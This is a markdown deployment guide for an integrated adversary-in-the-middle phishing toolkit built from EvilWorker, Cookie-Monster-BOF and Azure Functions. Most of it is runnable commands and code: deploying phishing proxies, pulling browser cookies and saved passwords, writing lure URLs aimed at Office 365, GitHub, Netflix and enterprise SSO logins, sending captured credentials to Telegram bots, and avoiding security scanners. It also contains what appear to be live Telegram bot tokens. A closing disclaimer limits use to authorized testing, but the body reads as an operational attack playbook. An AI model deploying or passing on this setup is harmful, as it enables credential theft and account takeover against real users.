# 🚀 INTEGRATED AiTM FRAMEWORK DEPLOYMENT GUIDE

## **EVILWORKER + COOKIE-MONSTER + AZURE AiTM FUNCTION**

This guide provides comprehensive instructions for deploying the **integrated cybersecurity toolkit** that combines:

1. **EvilWorker** - Service worker-based AiTM phishing framework
2. **Cookie-Monster-BOF** - Advanced browser cookie extraction tool
3. **Azure AiTM Functions** - Enhanced phishing infrastructure with Telegram monitoring

---

## 📋 PREREQUISITES

### **System Requirements**
- **Node.js**: Version 22.15.0+ (required for zstd compression support)
- **Azure CLI**: Latest version with authenticated access
- **Git**: For cloning repositories
- **Python 3.8+**: For Cookie-Monster decryption scripts

### **Azure Resources**
- **Azure Subscription**: Active subscription with billing enabled
- **Resource Group**: For organizing all resources
- **Function App**: For hosting the AiTM functions
- **Storage Account**: For logs and session data

---

## 🏗️ DEPLOYMENT ARCHITECTURE

```
┌─────────────────────────────────────────────────────────────────┐
│                    INTEGRATED AiTM FRAMEWORK                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────┐    ┌─────────────────┐    ┌─────────────┐ │
│  │   EvilWorker    │    │ Cookie-Monster  │    │ Azure AiTM  │ │
│  │  Service Worker │    │   BOF Tool      │    │  Functions  │ │
│  │     Proxy       │    │  Cookie Extract │    │  Telegram   │ │
│  └─────────────────┘    └─────────────────┘    │  Monitoring │ │
│           │                       │            └─────────────┘ │
│           │                       │                    │       │
│           ▼                       ▼                    ▼       │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │              UNIFIED PHISHING INFRASTRUCTURE               │ │
│  │                                                             │ │
│  │  • Service Worker Interception                             │ │
│  │  • Real-time Cookie Extraction                             │ │
│  │  • Advanced Session Hijacking                              │ │
│  │  • Telegram Bot Notifications                              │ │
│  │  • Multi-Platform Support                                  │ │
│  └─────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🚀 STEP 1: EVILWORKER DEPLOYMENT

### **1.1 Clone EvilWorker Repository**
```bash
git clone https://github.com/Ahaz1701/EvilWorker.git
cd EvilWorker
```

### **1.2 Local Testing Setup**
```bash
# Install dependencies (none required - uses standard Node.js libraries)
node proxy_server.js

# In another terminal, start ngrok for HTTPS
ngrok http 3000
```

### **1.3 Production Deployment (Azure Web Apps)**
```bash
# Create Azure Web App
az webapp create \
  --resource-group "aitm-phishing-rg" \
  --plan "EastUSPlan" \
  --name "evilworker-phishing" \
  --runtime "NODE|22-lts"

# Deploy EvilWorker code
az webapp deployment source config \
  --name "evilworker-phishing" \
  --resource-group "aitm-phishing-rg" \
  --repo-url "https://github.com/Ahaz1701/EvilWorker.git" \
  --branch "main"
```

### **1.4 EvilWorker Configuration**
```javascript
// Modify these constants in proxy_server.js
const PROXY_ENTRY_POINT = "/custom-login-path?param1=value1&param2=value2";
const PHISHED_URL_PARAMETER = "custom_redirect_param";

const PROXY_FILES = {
    index: "custom_index_ABC123.html",
    notFound: "custom_404_XYZ789.html",
    script: "custom_script_DEF456.js"
};

const PROXY_PATHNAMES = {
    proxy: "/custom-proxy-endpoint",
    serviceWorker: "/custom_service_worker.js",
    script: "/custom-script-path",
    mutation: "/custom-mutation-handler",
    jsCookie: "/custom-cookie-handler",
    favicon: "/favicon.ico"
};

// Change encryption key
const ENCRYPTION_KEY = "Your-Custom-32-Character-Key-Here";
```

---

## 🍪 STEP 2: COOKIE-MONSTER-BOF INTEGRATION

### **2.1 Clone Cookie-Monster Repository**
```bash
git clone https://github.com/KingOfTheNOPs/cookie-monster.git
cd cookie-monster
```

### **2.2 Install Python Dependencies**
```bash
pip3 install -r requirements.txt
# Installs: pycryptodome, pyasn1_modules
```

### **2.3 Compile BOF Files**
```bash
# Ensure Mingw-w64 and make are installed
make

# This creates:
# - cookie-monster-bof.x64.o (64-bit)
# - cookie-monster-bof.x86.o (32-bit)
```

### **2.4 Test Cookie-Monster Functionality**
```bash
# Extract Chrome cookies
cookie-monster --chrome --cookie-only

# Extract Edge cookies
cookie-monster --edge --cookie-only

# Extract passwords
cookie-monster --chrome --login-data-only

# Extract app-bound encryption keys
cookie-monster --system "C:\Users\<USER>\AppData\Local\Chrome\User Data\Local State" <PID>
```

### **2.5 Decrypt Captured Data**
```bash
# Decrypt cookies
python3 decrypt.py -k "extracted_key" -o cookies -f ChromeCookies.db

# Export for CuddlePhish
python3 decrypt.py -k "extracted_key" -o cuddlephish -f ChromeCookies.db

# Extract passwords
python3 decrypt.py -k "extracted_key" -o passwords -f ChromePasswords.db
```

---

## ⚡ STEP 3: AZURE AiTM FUNCTION DEPLOYMENT

### **3.1 Deploy Enhanced Functions**
```bash
# Deploy to existing Azure Function App
az functionapp deployment source config \
  --name "azureaitm-phishing-demo-1755253259" \
  --resource-group "AzureAiTM-ResourceGroup" \
  --repo-url "https://github.com/your-repo/azure-aitm-framework.git" \
  --branch "main"
```

### **3.2 Configure Function App Settings**
```bash
# Set Node.js version
az functionapp config appsettings set \
  --name "azureaitm-phishing-demo-1755253259" \
  --resource-group "AzureAiTM-ResourceGroup" \
  --settings "WEBSITE_NODE_DEFAULT_VERSION=22.15.0"

# Enable HTTPS only
az functionapp config set \
  --name "azureaitm-phishing-demo-1755253259" \
  --resource-group "AzureAiTM-ResourceGroup" \
  --https-only true
```

### **3.3 Telegram Bot Configuration**
```bash
# Set Telegram bot tokens
az functionapp config appsettings set \
  --name "azureaitm-phishing-demo-1755253259" \
  --resource-group "AzureAiTM-ResourceGroup" \
  --settings \
    "TELEGRAM_BOT_1_TOKEN=7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps" \
    "TELEGRAM_BOT_1_CHAT_ID=6743632244" \
    "TELEGRAM_BOT_2_TOKEN=7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U" \
    "TELEGRAM_BOT_2_CHAT_ID=6263177378"
```

---

## 🔗 STEP 4: INTEGRATION & UNIFIED DEPLOYMENT

### **4.1 Deploy Integrated Function**
```bash
# Copy the integrated function to your Azure Function App
az functionapp deployment source config-zip \
  --resource-group "AzureAiTM-ResourceGroup" \
  --name "azureaitm-phishing-demo-1755253259" \
  --src "evilworker_integration.zip"
```

### **4.2 Create Unified Phishing URL**
```bash
# EvilWorker + Azure Function integration URL
https://azureaitm-phishing-demo-1755253259.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

### **4.3 Test Integration**
```bash
# Test the integrated endpoint
curl -X GET "https://azureaitm-phishing-demo-1755253259.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"

# Expected response: HTML page with service worker registration
```

---

## 🎯 STEP 5: ADVANCED ATTACK SCENARIOS

### **5.1 Microsoft Office 365 + ADFS Bypass**
```bash
# Target Office 365 with ADFS
https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D1fec8e78-bce4-4aaf-ab1b-5451cc387264%26resource%3Dhttps%3A%2F%2Fgraph.microsoft.com%2F%26redirect_uri%3Dhttps%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient
```

### **5.2 Multi-Service Campaign**
```bash
# GitHub
https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fgithub.com%2Flogin

# Stack Overflow
https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fstackoverflow.com%2Fusers%2Flogin

# Netflix
https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fwww.netflix.com%2Flogin
```

### **5.3 Enterprise SSO Targeting**
```bash
# Custom enterprise SSO portal
https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Fyour-company.com%2Flogin
```

---

## 📊 STEP 6: MONITORING & INTELLIGENCE

### **6.1 Real-Time Telegram Notifications**
```bash
# Monitor your Telegram bot for:
# - New session starts
# - Email captures
# - Password submissions
# - Cookie extractions
# - Error notifications
```

### **6.2 Log Analysis**
```bash
# Decrypt EvilWorker logs
node decrypt_log_file.js phishing_logs/domain__timestamp

# Analyze Cookie-Monster output
python3 decrypt.py -k "key" -o cookies -f ChromeCookies.db

# Generate CuddlePhish format
python3 decrypt.py -k "key" -o cuddlephish -f ChromeCookies.db
```

### **6.3 Session Intelligence**
```bash
# View active sessions
curl -H "x-functions-key: YOUR_FUNCTION_KEY" \
  "https://azureaitm-phishing-demo-1755253259.azurewebsites.net/__stats"

# Get session details
curl -H "x-functions-key: YOUR_FUNCTION_KEY" \
  "https://azureaitm-phishing-demo-1755253259.azurewebsites.net/__session/{sessionId}"
```

---

## 🛡️ STEP 7: EVASION & STEALTH

### **7.1 Domain Masking**
```bash
# Use Cloudflare Workers for additional masking
# Deploy cloudflare-worker.js to Cloudflare

# Use Vercel for frontend masking
# Deploy to Vercel with custom domain
```

### **7.2 Traffic Normalization**
```javascript
// Add realistic browser headers
headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36';
headers['accept-encoding'] = 'gzip, deflate, br';
headers['accept-language'] = 'en-US,en;q=0.9';
headers['sec-ch-ua'] = '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"';
```

### **7.3 Bot Detection Evasion**
```javascript
// Implement bot detection bypass
function isBot(userAgent) {
    const botPatterns = [
        'bot', 'crawler', 'spider', 'scraper', 'scanner',
        'security', 'malware', 'virus', 'threat'
    ];
    const ua = userAgent.toLowerCase();
    return botPatterns.some(pattern => ua.includes(pattern));
}
```

---

## 🔧 STEP 8: TROUBLESHOOTING

### **8.1 Common Issues**

**Service Worker Not Registering:**
```bash
# Check HTTPS requirement
# Ensure Node.js version 22.15.0+
# Verify file paths and permissions
```

**Cookie Extraction Failing:**
```bash
# Check Chrome/Edge version compatibility
# Verify process injection permissions
# Test with --key-only flag first
```

**Azure Function Errors:**
```bash
# Check function app logs
az functionapp logs tail --name "azureaitm-phishing-demo-1755253259" --resource-group "AzureAiTM-ResourceGroup"

# Verify environment variables
az functionapp config appsettings list --name "azureaitm-phishing-demo-1755253259" --resource-group "AzureAiTM-ResourceGroup"
```

### **8.2 Performance Optimization**
```bash
# Enable Azure Function scaling
az functionapp plan update \
  --name "EastUSPlan" \
  --resource-group "aitm-phishing-rg" \
  --sku "P1v2"

# Configure auto-scaling
az monitor autoscale create \
  --resource-group "aitm-phishing-rg" \
  --resource "azureaitm-phishing-demo-1755253259" \
  --resource-type "Microsoft.Web/sites" \
  --name "autoscale-aitm" \
  --min-count 1 \
  --max-count 10 \
  --count 1
```

---

## 📈 STEP 9: ADVANCED FEATURES

### **9.1 Machine Learning Integration**
```python
# Add ML-based phishing detection bypass
import tensorflow as tf

def analyze_user_behavior(user_actions):
    # ML model to predict legitimate vs suspicious behavior
    prediction = ml_model.predict(user_actions)
    return prediction > 0.5
```

### **9.2 Advanced Evasion Techniques**
```javascript
// Dynamic IOC generation
function generateDynamicIOC() {
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    return `/dynamic-${timestamp}-${random}`;
}

// Traffic pattern randomization
function randomizeTrafficPattern() {
    const delays = [100, 200, 300, 500, 800];
    const randomDelay = delays[Math.floor(Math.random() * delays.length)];
    return new Promise(resolve => setTimeout(resolve, randomDelay));
}
```

### **9.3 Cross-Platform Support**
```bash
# Mobile browser optimization
# iOS Safari support
# Android Chrome support
# Progressive Web App capabilities
```

---

## 🚨 STEP 10: SECURITY & COMPLIANCE

### **10.1 Legal Requirements**
- **Written Authorization**: Always obtain proper authorization
- **Scope Definition**: Clearly define testing scope
- **Data Handling**: Secure handling of captured data
- **Cleanup Procedures**: Remove all traces after testing

### **10.2 Ethical Guidelines**
- **Authorized Testing Only**: Use only on systems you own or have permission to test
- **Responsible Disclosure**: Report vulnerabilities through proper channels
- **Minimal Impact**: Minimize disruption to legitimate services
- **Data Protection**: Encrypt and secure all captured data

### **10.3 Risk Mitigation**
```bash
# Implement rate limiting
# Add IP whitelisting
# Enable audit logging
# Configure alerting thresholds
```

---

## 🎯 CONCLUSION

This integrated framework represents a **state-of-the-art cybersecurity toolkit** that combines:

1. **EvilWorker's** innovative service worker approach
2. **Cookie-Monster's** advanced browser exploitation capabilities
3. **Azure Functions'** scalable cloud infrastructure
4. **Real-time monitoring** through Telegram integration
5. **Advanced evasion** and stealth techniques

### **Key Advantages:**
- **Zero-configuration** phishing campaigns
- **Universal target support** without phishlets
- **Advanced post-exploitation** capabilities
- **Real-time intelligence** gathering
- **Professional-grade** infrastructure

### **Use Cases:**
- **Red Team Engagements**: Advanced penetration testing
- **Security Research**: Understanding modern attack vectors
- **Defense Development**: Building better detection mechanisms
- **Training & Education**: Cybersecurity awareness programs

---

## 📚 ADDITIONAL RESOURCES

- **EvilWorker Documentation**: [Medium Article](https://medium.com/@ahaz1701/evilworker-da94ae171249)
- **Cookie-Monster Repository**: [GitHub](https://github.com/KingOfTheNOPs/cookie-monster.git)
- **Azure Functions Documentation**: [Microsoft Docs](https://docs.microsoft.com/en-us/azure/azure-functions/)
- **Service Worker API**: [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)

---

**⚠️ DISCLAIMER**: This framework is for **authorized research and educational purposes only**. Use only on systems you own or have explicit permission to test. Ensure compliance with all applicable laws and regulations.
